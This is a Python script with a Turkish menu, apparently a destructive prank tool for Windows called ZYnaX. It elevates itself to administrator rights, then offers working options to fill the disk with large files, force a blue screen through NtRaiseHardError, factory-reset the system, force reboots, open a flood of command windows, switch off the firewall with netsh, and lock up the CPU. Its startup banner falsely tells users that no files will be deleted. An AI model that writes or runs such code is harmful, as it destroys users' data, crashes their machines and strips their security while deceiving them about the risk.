import os
import sys
import time
import ctypes
import threading
import json
import random
import platform
import subprocess
from urllib.request import urlopen

# --- RENK PALETİ ---
R, G, Y, B, C, W, RES = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[97m", "\033[0m"
os.system("") 

def temizle():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- 5 SANİYELİK KRİTİK GİRİŞ ---
def giris_ekrani():
    temizle()
    print(f"\n\n\t\t{R}╔══════════════════════════════════════════════╗")
    print(f"\t\t║          !!! ZYnaX SİBER GÜVENLİK !!!        ║")
    print(f"\t\t╚══════════════════════════════════════════════╝{RES}")
    print(f"\n\t\t{Y}DİKKAT: Hiçbir kullanıcı dosyası SİLİNMEYECEKTİR.")
    print(f"\t\tSistem kararlılığı için testler başlatılıyor.{RES}")
    print(f"\t\t{C}Yusuf Dadaş'ın komut merkezi yükleniyor...{RES}")
    for i in range(5, 0, -1):
        print(f"\t\t[ SİSTEMİN AÇILMASINA: {i} SANİYE ]", end="\r")
        time.sleep(1)
    print("\n\n\t\t[+] ERİŞİM ONAYLANDI! KERNEL AKTİF.")
    time.sleep(1)

# --- [02] DİSK BOMBACISI (GELİŞMİŞ MODÜL) ---
def disk_bombasi():
    temizle()
    print(f"{R}—"*65 + f"\n\t[!!!] ÖZEL DİSK BOMBARDIMANI (MB/GB) [!!!]\n" + "—"*65 + f"{RES}")
    try:
        yol_input = input(f"\n{C}[?] Hedef Klasör Yolu ('m' = Masaüstü): {RES}").strip()
        if yol_input.lower() == 'm':
            yol = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'zynax_payload.dat')
        else:
            yol = os.path.join(yol_input, 'zynax_payload.dat') if os.path.isdir(yol_input) else yol_input
        
        birim = input(f"{Y}[?] Boyut birimi (mb / gb): {RES}").lower()
        miktar = int(input(f"{Y}[?] Miktar girin: {RES}"))
        
        boyut = miktar * 1024 * 1024 if birim == "mb" else miktar * 1024 * 1024 * 1024

        print(f"\n{B}[*] Hedef Belirlendi: {yol}")
        print(f"[*] İşlem Başlıyor... Lütfen bekleyin.{RES}")

        with open(yol, "wb") as f:
            f.seek(boyut - 1)
            f.write(b"\0")
        
        for i in range(1, 11):
            print(f"{R}[!] YAZILIYOR: %{i*10}{RES}", end="\r")
            time.sleep(0.1)
        print(f"\n\n{G}[+] BAŞARILI! {miktar} {birim.upper()} dosya oluşturuldu.{RES}")
    except Exception as e: print(f"{R}[X] Hata: {e}{RES}")
    input(f"\n{W}Ana menüye dönmek için ENTER...{RES}")

# --- ANA MENÜ (11/11 TAM LİSTE) ---
def ana_menu():
    temizle()
    # Gökkuşağı Logo
    print(f"{R}  ________" + f"{G}                    _____" + f"{Y}    ____" + f"{B}  ___")
    print(f"{R}  \_____  \\" + f"{G}  ___.__." + f"{Y}  ____" + f"{B}    /  _  \\" + f"{C}    \    \\" + f"{W}/  /")
    print(f"{R}   /   |   \\" + f"{G}<   |  |" + f"{Y} /    \\" + f"{B}  /  /_\  \\" + f"{C}    \      /")
    print(f"{R}  /    |    \\" + f"{G} \___  |" + f"{Y}|    |" + f"{B}  \/    |    \\" + f"{C}    /      \\")
    print(f"{R}  \_______  /" + f"{G} / ____|" + f"{Y}|___|" + f"{B}  /\____|__  /" + f"{C}    /___/\  \\")
    print(f"{R}          \/" + f"{G}  \/      " + f"{Y}    \/" + f"{B}          \/" + f"{C}           \_/")
    
    print(f"\n\t{R}[!]{G} ZYnaX{Y} v190{B} |{C} 11/11{W} MEGA SÜRÜM{RES}")
    print(f"{C}—"*75 + f"{RES}")
    print(f" [01] {Y}IP / SİSTEM ANALİZİ{RES}         [07] {R}SONSUZ PENCERE BOMBASI{RES}")
    print(f" [02] {Y}DİSK BOMBACISI (MB/GB){RES}      [08] {R}GÜVENLİK DUVARI KAPAT{RES}")
    print(f" [03] {R}MAVİ EKRAN (BSOD){RES}            [09] {R}SİSTEMİ KİLİTLE (PARALYZE){RES}")
    print(f" [04] {R}SİSTEMİ SIFIRLA (HARD){RES}       [10] {R}SONSUZ REBOOT DÖNGÜSÜ{RES}")
    print(f" [05] {B}YENİDEN BAŞLATMA{RES}             [11] {C}PROGRAMDAN GÜVENLİ ÇIKIŞ{RES}")
    print(f" [06] {C}BIOS AYARLARINA ZORLA{RES}        {W}-------------------------{RES}")
    print(f"{C}—"*75 + f"{RES}")

    secim = input(f"\n {B}ZYnAx_DADAS > {RES}")

    if secim == "1":
        temizle()
        print(f"{C}[*] Cihaz Verileri Çekiliyor...{RES}")
        try:
            d = json.loads(urlopen("http://ip-api.com/json/").read().decode())
            print(f"\n{G}Sistem: {platform.system()} {platform.release()}")
            print(f"IP: {d.get('query')} | Ülke: {d.get('country')}{RES}")
        except: pass
        input("\nDevam etmek için ENTER..."); ana_menu()
    
    elif secim == "2": disk_bombasi(); ana_menu()
    
    elif secim == "3":
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    
    elif secim == "4":
        if input(f"{R}EMİN MİSİN? (e/h): {RES}").lower() == 'e': os.system("systemreset -factoryreset")
        else: ana_menu()
    
    elif secim == "5": os.system("shutdown /r /t 0")
    
    elif secim == "6": os.system("shutdown /r /fw /t 0")
    
    elif secim == "7":
        print(f"{R}[!] Pencereler patlıyor...{RES}")
        for _ in range(20): os.system("start cmd.exe")
        ana_menu()
    
    elif secim == "8":
        os.system("netsh advfirewall set allprofiles state off")
        print(f"{G}[+] Güvenlik duvarı devre dışı.{RES}"); time.sleep(2); ana_menu()
    
    elif secim == "9":
        print(f"{R}[!] İşlemci yükü arttırılıyor...{RES}")
        def kilit():
            while True: pass
        for _ in range(50): threading.Thread(target=kilit, daemon=True).start()
        time.sleep(3); ana_menu()
    
    elif secim == "10": os.system("shutdown /r /t 0")
    
    elif secim == "11": sys.exit()
    
    else: ana_menu()

if __name__ == "__main__":
    # Yönetici İzni Kontrolü
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ", None, 1)
        sys.exit()
    
    giris_ekrani()
    ana_menu()
